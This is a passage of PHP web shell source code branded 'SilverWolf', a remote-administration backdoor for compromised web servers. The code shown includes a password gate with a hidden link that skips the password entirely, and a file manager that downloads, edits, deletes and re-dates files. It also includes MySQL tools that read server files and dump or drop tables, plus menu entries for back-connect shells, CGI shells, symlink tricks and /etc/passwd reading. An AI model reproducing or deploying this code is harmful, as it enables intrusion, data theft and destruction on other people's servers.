<?php
error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
@set_time_limit(0);
foreach(array('_GET','_POST') as $_request) {
	foreach($$_request as $_key => $_value) {
		if ($_key{0} != '_') {
			if (IS_GPC) {
				$_value = s_array($_value);
			}
			$$_key = $_value;
		}
	}
}
$admin = array();
$admin['check'] = true;
$admin['pass']  = '0a32677cb55b58ed4056561717b652de';

$admin['cookiename'] = 'AkajiR0';
$admin['cookiepre'] = '';
$admin['cookiedomain'] = '';
$admin['cookiepath'] = '/';
$admin['cookielife'] = 86400;

if ($charset == 'utf8') {
	header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
	header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
	header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
	header("content-Type: text/html; charset=iso-8859-2");
}

$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();

/*===================== Login =====================*/
if ($action == "logout") {
	scookie($admin['cookiename'], '', -86400 * 365);
	p('<meta http-equiv="refresh" content="0;URL='.$self.'">');
	p('<body background=black>');
	exit;
}

if($admin['check']) {
	if ($doing == 'login') {
		if ($admin['pass'] == md5($password)) {
			scookie($admin['cookiename'], $admin['pass']);
            //Store current session
            doSmt($password);
			p('<meta http-equiv="refresh" content="2;URL='.$self.'">');
			p('<body bgcolor=black>
<BR><BR><div align=center><font color=yellow face=tahoma size=2>Loading Shell...<BR><img src=https://silverwolf-share-tools.googlecode.com/svn/loading.jpg></div>');
			exit;
		}

	else
	{
	$err_mess = '<table width=100%><tr><td bgcolor=#0E0E0E width=100% height=24><div align=center><font color=red face=tahoma size=2><blink>Wrong password!!!</blink><BR></font></div></td><td bgcolor=#000000><font color=black><a href="?res=1">&nbsp;&nbsp;</a></font></td></tr></table>';
    echo $err_mess;
	}}
    if(isset($_GET['res']))
    {
        scookie($admin['cookiename'], $admin['pass']);
        p('<meta http-equiv="refresh" content="2;URL='.$self.'">');
        p('<body bgcolor=black><BR><BR><div align=center><font color=yellow face=tahoma size=2>Loading Shell...<BR><img src=https://silverwolf-share-tools.googlecode.com/svn/loading.jpg></div>');
        exit;
    }
	if ($_COOKIE[$admin['cookiename']]) {
		if ($_COOKIE[$admin['cookiename']] != $admin['pass']) {
            echo $_COOKIE[$admin['cookiename']];
			loginpage();
		}
	} else {
        echo $_COOKIE[$admin['cookiename']];
		loginpage();
	}
    
}
/*===================== Login =====================*/

$errmsg = '';

if ($action == 'phpinfo') {
	if (IS_PHPINFO) {
		phpinfo();
	} else {
		$errmsg = 'phpinfo() function has non-permissible';
	}
}


if ($doing == 'downfile' && $thefile) {
	if (!@file_exists($thefile)) {
		$errmsg = 'The file you want Downloadable was nonexistent';
	} else {
		$fileinfo = pathinfo($thefile);
		header('Content-type: application/x-'.$fileinfo['extension']);
		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
		header('Content-Length: '.filesize($thefile));
		@readfile($thefile);
		exit;
	}
}

if ($doing == 'backupmysql' && !$saveasfile) {
	dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
	$table = array_flip($table);
	$result = q("SHOW tables");
	if (!$result) p('<h2>'.mysql_error().'</h2>');
	$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if (isset($table[$currow[0]])) {
			$mysqldata .= sqldumptable($currow[0]);
		}
	}
	mysql_close();
	exit;
}

// Mysql
if($doing=='mysqldown'){
	if (!$dbname) {
		$errmsg = ' dbname';
	} else {
		dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		if (!file_exists($mysqldlfile)) {
			$errmsg = 'The file you want Downloadable was nonexistent';
		} else {
			$result = q("select load_file('$mysqldlfile');");
			if(!$result){
				q("DROP TABLE IF EXISTS tmp_angel;");
				q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
				//Download SQL
				q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
				$result = q("select content from tmp_angel");
				q("DROP TABLE tmp_angel");
			}
			$row = @mysql_fetch_array($result);
			if (!$row) {
				$errmsg = 'Load file failed '.mysql_error();
			} else {
				$fileinfo = pathinfo($mysqldlfile);
				header('Content-type: application/x-'.$fileinfo['extension']);
				header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
				header("Accept-Length: ".strlen($row[0]));
				echo $row[0];
				exit;
			}
		}
	}
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?php echo "Website : ".$_SERVER['HTTP_HOST']."";?> | <?php echo "IP : ".gethostbyname($_SERVER['SERVER_NAME'])."";?> </title>
<style type="text/css">
body,td{font: 10pt Tahoma;color:gray;line-height: 16px;}

a {color: #74A202;text-decoration:none;}
a:hover{color: #f00;text-decoration:underline;}
.alt1 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.fout1 td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.fout td{border-top:1px solid gray;border-bottom:0px solid gray;background:#202020;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:bold;}
.head_small td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:normal;font-size:8pt;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
input, textarea, button
{
	font-size: 9pt;
	color: #ccc;
	font-family: verdana, sans-serif;
	background-color: #202020;
	border-left: 1px solid #74A202;
	border-top: 1px solid #74A202;
	border-right: 1px solid #74A202;
	border-bottom: 1px solid #74A202;
}
select
{
	font-size: 8pt;
	font-weight: normal;
	color: #ccc;
	font-family: verdana, sans-serif;
	background-color: #202020;
}

</style>
<script type="text/javascript">
function CheckAll(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
}
function goaction(act){
	$('goaction').action.value=act;
	$('goaction').submit();
}
</script>
</head>
<body onLoad="init()" style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=black background=https://silverwolf-share-tools.googlecode.com/svn/th_matrix.gif>
<div border="0" style="position:fixed; width: 100%; height: 25px; z-index: 1; top: 300px; left: 0;" id="loading" align="center" valign="center">
				<table border="1" width="110px" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#003300">
					<tr>
						<td align="center" valign=center>
				 <div border="1" style="background-color: #0E0E0E; filter: alpha(opacity=70); opacity: .7; width: 110px; height: 25px; z-index: 1; border-collapse: collapse;" bordercolor="#006600"  align="center">
				   Loading<img src="https://silverwolf-share-tools.googlecode.com/svn/loading.gif">
				  </div>
				</td>
					</tr>
				</table>
</div>
 <script>
 var ld=(document.all);
  var ns4=document.layers;
 var ns6=document.getElementById&&!document.all;
 var ie4=document.all;
  if (ns4)
 	ld=document.loading;
 else if (ns6)
 	ld=document.getElementById("loading").style;
 else if (ie4)
 	ld=document.all.loading.style;
  function init()
 {
 if(ns4){ld.visibility="hidden";}
 else if (ns6||ie4) ld.display="none";
 }
 </script>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head_small">
		<td  width=100%>
		<table width=100%><tr class="head_small"><td  width=86px><p><a title=" .:: Warning ! This shell is used for education purpose ::. " href="<?php $self;?>"><img src=https://fbcdn-profile-a.akamaihd.net/hprofile-ak-ash3/c0.0.180.180/s160x160/943627_383486545099035_185948157_a.jpg height=86 border=0></a></p>
	        </td>
		<td>
            
		<span style="float:left;"> <?php echo "Host: ".$_SERVER['HTTP_HOST']."";?> | Server IP: <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> | Your IP: <?php echo "<font color=yellow>".$_SERVER['REMOTE_ADDR']."</font>";?>
	  | <a href="https://www.facebook.com/hoi.hacker.vn" target="_blank"><?php echo str_replace('.','','SilverWolf');?> </a> | <a href="javascript:goaction('logout');"><font color=red> Logout</font></a></span> <br />

		<?php
		$curl_on = @function_exists('curl_version');
		$mysql_on = @function_exists('mysql_connect');
		$mssql_on = @function_exists('mssql_connect');
		$pg_on = @function_exists('pg_connect');
		$ora_on = @function_exists('ocilogon');

echo (($safe_mode)?("Safe_mod: <b><font color=green>ON</font></b> - "):("Safe_mod: <b><font color=red>OFF</font></b> - "));
echo "PHP version: <b>".@phpversion()."</b> - ";
		echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b> - "):("<b><font color=red>OFF</font></b> - "));
		echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b> - "; } else { echo "<font color=red>OFF</font></b> - "; }
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b> - ";}else{echo "<font color=red>OFF</font></b> - ";}
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b> - ";}else{echo "<font color=red>OFF</font></b> - ";}
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b><BR>";}

echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b><BR>";}else{echo "<font color=red>$df</font></b><BR>";}

echo "<font color=white>Uname -a</font>: ".@substr(@php_uname(),0,120)."<br>";
echo "<font color=white>Server</font>: ".@substr($SERVER_SOFTWARE,0,120)." - <font color=white>id</font>: ".@getmyuid()."(".@get_current_user().") - uid=".@getmyuid()." (".@get_current_user().") gid=".@getmygid()."(".@get_current_user().")<br>";
		?>
</td></tr></table></td>
	</tr>
	<tr class="alt1">
		<td  width=10%><a href="javascript:goaction('file');">Files | </a>
			<a href="javascript:goaction('sqladmin');">SQL | </a>
            <a href="javascript:goaction('newcommand');">Visual CMD | </a>
            <a href="javascript:goaction('dumper');">Dumper | </a>
            <a href="javascript:goaction('upshell');">OSS Shell Upload | </a>
            <a href="javascript:goaction('changepas');">OSS Pass Changer | </a>
            <a href="javascript:goaction('symroot');">HD Hack VPS | </a>
			<a href="javascript:goaction('command');">CMD | </a>
			<?php if (!IS_WIN) {?> | <a href="javascript:goaction('etcpwd');">/etc/passwd</a> <?php }?>
			<?php if (!IS_WIN) {?> | <a href="javascript:goaction('error.log');">Create CGI Shell</a><?php }?>
            <?php if (!IS_WIN) {?> | <a href="error/error.log" target="_blank">Open CGI</a><?php }?>
            <?php if (!IS_WIN) {?> | <a href="javascript:goaction('symroot');">Sym Root</a><?php }?>
            <?php if (!IS_WIN) {?> | <a href="sym/" target="_blank">Open Sym </a><?php }?>
			<?php if (!IS_WIN) {?> | <a href="javascript:goaction('bypass');">By Pass</a><?php }?> 
            <?php if (!IS_WIN) {?> | <a href="javascript:goaction('leech');">Leech</a><?php }?>   
			<?php if (!IS_WIN) {?> | <a href="javascript:goaction('backconnect');">Back connect</a><?php }?>
			<?php if (!IS_WIN) {?> | <a href="javascript:goaction('reverseip');">Reverse IP</a><?php }?> 
            </td>
	</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php

formhead(array('name'=>'goaction'));
makehide('action');
formfoot();

$errmsg && m($errmsg);

// Dir function
!$dir && $dir = '.';
$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
	$dir = $dir.'/';
}
$uedir = ue($dir);

if (!$action || $action == 'file') {

	// Non-writeable
	$dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';

	// Delete dir
	if ($doing == 'deldir' && $thefile) {
		if (!file_exists($thefile)) {
			m($thefile.' directory does not exist');
		} else {
			m('Directory delete '.(deltree($thefile) ? basename($thefile).' success' : 'failed'));
		}
	}

	// Create new dir
	elseif ($newdirname) {
		$mkdirs = $nowpath.$newdirname;
		if (file_exists($mkdirs)) {
			m('Directory has already existed');
		} else {
			m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));
			@chmod($mkdirs,0777);
		}
	}

	// Upload file
	elseif ($doupfile) {
		m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
	}

	// Edit file
	elseif ($editfilename && $filecontent) {
		$fp = @fopen($editfilename,'w');
		m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
		@fclose($fp);
	}

	// Modify
	elseif ($pfile && $newperm) {
		if (!file_exists($pfile)) {
			m('The original file does not exist');
		} else {
			$newperm = base_convert($newperm,8,10);
			m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
		}
	}

	// Rename
	elseif ($oldname && $newfilename) {
		$nname = $nowpath.$newfilename;
		if (file_exists($nname) || !file_exists($oldname)) {
			m($nname.' has already existed or original file does not exist');
		} else {
			m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
		}
	}

	// Copu
	elseif ($sname && $tofile) {
		if (file_exists($tofile) || !file_exists($sname)) {
			m('The goal file has already existed or original file does not exist');
		} else {
			m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
		}
	}

	// File exit
	elseif ($curfile && $tarfile) {
		if (!@file_exists($curfile) || !@file_exists($tarfile)) {
			m('The goal file has already existed or original file does not exist');
		} else {
			$time = @filemtime($tarfile);
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
		}
	}

	// Date
	elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
		if (!@file_exists($curfile)) {
			m(basename($curfile).' does not exist');
		} else {
			$time = strtotime("$year-$month-$day $hour:$minute:$second");
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
		}
	}

	// Download
	elseif($doing == 'downrar') {
		if ($dl) {
			$dfiles='';
			foreach ($dl as $filepath => $value) {
				$dfiles.=$filepath.',';
			}
			$dfiles=substr($dfiles,0,strlen($dfiles)-1);
			$dl=explode(',',$dfiles);
			$zip=new PHPZip($dl);
			$code=$zip->out;
			header('Content-type: application/octet-stream');
			header('Accept-Ranges: bytes');
			header('Accept-Length: '.strlen($code));
			header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');
			echo $code;
			exit;
		} else {
			m('Please select file(s)');
		}
	}

	// Delete file
	elseif($doing == 'delfiles') {
		if ($dl) {
			$dfiles='';
			$succ = $fail = 0;
			foreach ($dl as $filepath => $value) {
				if (@unlink($filepath)) {
					$succ++;
				} else {
					$fail++;
				}
			}

			m('Deleted >> success '.$succ.' fail '.$fail);
		} else {
			m('Please select file(s)');
		}
	}

	// Function Newdir
	formhead(array('name'=>'createdir'));
	makehide('newdirname');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'fileperm'));
	makehide('newperm');
	makehide('pfile');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'copyfile'));
	makehide('sname');
	makehide('tofile');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'rename'));
	makehide('oldname');
	makehide('newfilename');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'fileopform'));
	makehide('action');
	makehide('opfile');
	makehide('dir');
	formfoot();

	$free = @disk_free_space($nowpath);
	!$free && $free = 0;
	$all = @disk_total_space($nowpath);
	!$all && $all = 0;
	$used = $all-$free;
	$used_percent = @round(100/($all/$free),2);
	p('<font color=yellow face=tahoma size=2><B>File Manager</b> </font> Current disk free <font color=red>'.sizecount($free).'</font> of <font color=red>'.sizecount($all).'</font> (<font color=red>'.$used_percent.'</font>%)</font>');

?>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
  <form action="" method="post" id="godir" name="godir">
  <tr>
    <td nowrap>Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
	<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:100%;margin:0 8px;"></td>
    <td nowrap><input class="bt" value="Tới" type="submit"></td>
  </tr>
  </form>
</table>
<script type="text/javascript">
function createdir(){
	var newdirname;
	newdirname = prompt('directory name:', '');
	if (!newdirname) return;
	$('createdir').newdirname.value=newdirname;
	$('createdir').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt('Current file:'+pfile+'\n new attribute:', '');
	if (!newperm) return;
	$('fileperm').newperm.value=newperm;
	$('fileperm').pfile.value=pfile;
	$('fileperm').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt('Original file:'+sname+'\n object file (fullpath):', '');
	if (!tofile) return;
	$('copyfile').tofile.value=tofile;
	$('copyfile').sname.value=sname;
	$('copyfile').submit();
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Former file name:'+oldname+'\n new filename:', '');
	if (!newfilename) return;
	$('rename').newfilename.value=newfilename;
	$('rename').oldname.value=oldname;
	$('rename').submit();
}
function dofile(doing,thefile,m){
	if (m && !confirm(m)) {
		return;
	}
	$('filelist').doing.value=doing;
	if (thefile){
		$('filelist').thefile.value=thefile;
	}
	$('filelist').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt('file name:', '');
	if (!filename) return;
	opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
	$('fileopform').action.value=action;
	$('fileopform').opfile.value=opfile;
	$('fileopform').dir.value=dir;
	$('fileopform').submit();
}
function godir(dir,view_writable){
	if (view_writable) {
		$('godir').view_writable.value=1;
	}
	$('godir').dir.value=dir;
	$('godir').submit();
}
</script>
  <?php
	tbhead();
	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">');
	p('<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$dir.'" type="hidden" /><input name="dir" value="'.$dir.'" type="hidden" /></div>');
	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">Trang Chủ</a>');
	if ($view_writable) {
		p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
	} else {
		p(' | <a href="javascript:godir(\''.$nowpath.'\',\'1\');">View Writable</a>');
	}
	p(' | <a href="javascript:createdir();">Tạo Thư Mục</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Tạo File</a>');
	if (IS_WIN && IS_COM) {
		$obj = new COM('scripting.filesystemobject');
		if ($obj && is_object($obj)) {
			$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Ổ',3 => 'Network',4 => 'Ổ CD',5 => 'RAM Disk');
			foreach($obj->Drives as $drive) {
				if ($drive->DriveType == 2) {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Size:'.sizecount($drive->TotalSize).'&#13;Free:'.sizecount($drive->FreeSpace).'&#13;Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				} else {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				}
			}
		}
	}

	p('</td></tr></form>');

	p('<tr class="head"><td>&nbsp;</td><td>Tên</td><td width="16%">Ngày thay đổi</td><td width="10%">Dung lượng</td><td width="20%">Chmod / Perms</td><td width="22%">Chức năng</td></tr>');

	// Get path
	$dirdata=array();
	$filedata=array();

	if ($view_writable) {
		$dirdata = GetList($nowpath);
	} else {
		// Open dir
		$dirs=@opendir($dir);
		while ($file=@readdir($dirs)) {
			$filepath=$nowpath.$file;
			if(@is_dir($filepath)){
				$dirdb['filename']=$file;
				$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$dirdb['dirchmod']=getChmod($filepath);
				$dirdb['dirperm']=getPerms($filepath);
				$dirdb['fileowner']=getUser($filepath);
				$dirdb['dirlink']=$nowpath;
				$dirdb['server_link']=$filepath;
				$dirdb['client_link']=ue($filepath);
				$dirdata[]=$dirdb;
			} else {
				$filedb['filename']=$file;
				$filedb['size']=sizecount(@filesize($filepath));
				$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$filedb['filechmod']=getChmod($filepath);
				$filedb['fileperm']=getPerms($filepath);
				$filedb['fileowner']=getUser($filepath);
				$filedb['dirlink']=$nowpath;
				$filedb['server_link']=$filepath;
				$filedb['client_link']=ue($filepath);
				$filedata[]=$filedb;
			}
		}// while
		unset($dirdb);
		unset($filedb);
		@closedir($dirs);
	}
	@sort($dirdata);
	@sort($filedata);
	$dir_i = '0';
	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			$thisbg = bg();
			p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
			p('<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>');
			p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
			p('<td nowrap>'.$dirdb['mtime'].'</td>');
			p('<td nowrap>--</td>');
			p('<td nowrap>');
			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');
			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');
			p('<td nowrap><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',\'Are you sure will delete '.$dirdb['filename'].'? \\n\\nIf non-empty directory, will be delete all the files.\')">Xóa</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">Đổi Tên</a></td>');
			p('</tr>');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
				p('<tr class=fout>');
				p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
				p('</tr>');
			}
		}
	}

	p('<tr bgcolor="green" stlye="border-top:1px solid gray;border-bottom:1px solid gray;"><td colspan="6" height="5"></td></tr>');
	p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
	makehide('action','file');
	makehide('thefile');
	makehide('doing');
	makehide('dir',$nowpath);
	$file_i = '0';
	foreach($filedata as $key => $filedb){
		if($filedb['filename']!='..' && $filedb['filename']!='.') {
			$fileurl = str_replace(SA_ROOT,'',$filedb['server_link']);
			$thisbg = bg();
			p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
			p('<td width="2%" nowrap><input type="checkbox" value="1" name="dl['.$filedb['server_link'].']"></td>');
			p('<td><a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a></td>');
			p('<td nowrap>'.$filedb['mtime'].'</td>');
			p('<td nowrap>'.$filedb['size'].'</td>');
			p('<td nowrap>');
			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');
			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');
			p('<td nowrap>');
			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Tải</a> | ');
			p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
			p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Sửa</a> | ');
			p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Đổi tên</a> | ');
			p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Time</a>');
			p('</td></tr>');
			$file_i++;
		}
	}
	p('<tr class="fout1"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Chọn hết</a> - <a href="javascript:dofile(\'delfiles\');">Xóa</a></td><td colspan="4" align="right">'.$dir_i.' Thư mục / '.$file_i.' Tệp tin</td></tr>');
	p('</form></table>');
}// end dir


?>
<script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$('doing').value=doing;
	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
	$('mysqlfile').charset.value=$('dbinfo').charset.value;
	$('mysqlfile').submit();
}
</script>
<?php

if ($action == 'sqladmin') {
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	$dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
	if(isset($dbhost)){
		$dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
	}
	if(isset($dbuser)) {
		$dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
	}
	if(isset($dbpass)) {
		$dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
	}
	if(isset($dbport)) {
		$dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
	}
	if(isset($dbname)) {
		$dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
	}
	if(isset($charset)) {
		$dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
	}

	if ($doing == 'backupmysql' && $saveasfile) {
		if (!$table) {
			m('Please choose the table');
		} else {
			dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			$table = array_flip($table);
			$fp = @fopen($path,'w');
			if ($fp) {
				$result = q('SHOW tables');
				if (!$result) p('<h2>'.mysql_error().'</h2>');
				$mysqldata = '';
				while ($currow = mysql_fetch_array($result)) {
					if (isset($table[$currow[0]])) {
						sqldumptable($currow[0], $fp);
					}
				}
				fclose($fp);
				$fileurl = str_replace(SA_ROOT,'',$path);
				m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
				mysql_close();
			} else {
				m('Backup failed');
			}
		}
	}
	if ($insert && $insertsql) {
		$keystr = $valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			if ($val) {
				$keystr .= $tmp.$key;
				$valstr .= $tmp."'".addslashes($val)."'";
				$tmp = ',';
			}
		}
		if ($keystr && $valstr) {
			dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
		}
	}
	if ($update && $insertsql && $base64) {
		$valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			$valstr .= $tmp.$key."='".addslashes($val)."'";
			$tmp = ',';
		}
		if ($valstr) {
			$where = base64_decode($base64);
			dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
		}
	}
	if ($doing == 'del' && $base64) {
		$where = base64_decode($base64);
		$delete_sql = "DELETE FROM $tablename WHERE $where";
		dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
	}

	if ($tablename && $doing == 'drop') {
		dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		if (q("DROP TABLE $tablename")) {
			m('Drop table of success');
			$tablename = '';
		} else {
			m(mysql_error());
		}
	}

	$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');

	formhead(array('title'=>'MYSQL Manager'));
	makehide('action','sqladmin');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
